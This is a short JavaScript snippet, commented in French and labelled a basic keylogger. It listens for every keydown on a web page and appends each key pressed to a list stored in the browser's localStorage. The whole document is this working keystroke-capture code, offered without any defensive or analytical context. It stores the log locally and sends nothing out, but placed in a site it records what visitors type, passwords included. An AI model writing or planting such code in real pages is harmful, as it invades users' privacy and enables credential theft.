// Script d'enregistrement des frappes au clavier (keylogger basique)
document.addEventListener('keydown', function(event) {
    // Récupérer la touche appuyée
    const key = event.key;
    // Enregistrer la touche dans le localStorage
    const logs = JSON.parse(localStorage.getItem('keylog')) || [];
    logs.push(key);
    localStorage.setItem('keylog', JSON.stringify(logs));
});
